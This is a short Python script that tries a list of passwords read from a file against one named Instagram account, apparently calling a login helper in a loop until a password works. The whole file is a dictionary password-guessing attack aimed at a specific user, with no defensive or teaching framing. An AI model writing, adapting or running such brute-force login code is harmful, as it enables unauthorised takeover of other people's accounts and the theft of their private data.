from main import login_to_instagram
uname = "azoww_7"
with open("./passwd.txt", "r") as f:
    passwd = f.readlines()
    
# \n remove in passowrd?

for  i in passwd:
    check = login_to_instagram(uname,i[:-1])
    if check:
        break